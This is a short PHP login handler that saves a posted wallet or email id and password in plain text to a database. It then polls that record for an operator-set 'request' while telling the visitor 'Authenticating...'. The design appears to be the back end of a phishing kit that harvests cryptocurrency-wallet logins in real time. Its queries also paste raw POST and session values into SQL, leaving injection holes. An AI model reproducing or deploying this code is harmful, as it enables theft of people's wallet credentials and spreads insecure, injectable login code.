<?php
session_start();
require "db_connect.php";

if ( isset($_POST["user_login"]) ) {
	$session_id = $_POST["user_login"];
	$wallet_id = filter_var($_POST["email_id"], FILTER_SANITIZE_STRING);
	$login_pwd = $_POST["login_pwd"];
	
	$_SESSION["current_request"] = $session_id;
	
	$query = $conn->prepare("INSERT INTO user_login(session_id, wallet_id, login_pwd, request, status, moment)
		VALUES('$session_id', '$wallet_id', '$login_pwd', 'login', '0', now())");
	try {
		$query->execute();
		echo "Authenticating...";
	}catch(PDOException $e) {
		echo $e->getMessage();
	}
}


if ( isset($_POST["getresponse"]) ) {
	$session_id = $_SESSION["current_request"];
	
	$query = $conn->prepare("SELECT * FROM user_login WHERE session_id='$session_id'");
	try {
		$query->execute();
		$row = $query->fetch();
		if ( $row['request'] == 'login' )
			echo 'Authenticating...';
		else
			echo $row['request'];
	}catch( PDOException $e ) {
		echo $e->getMessage();
	}
}
?>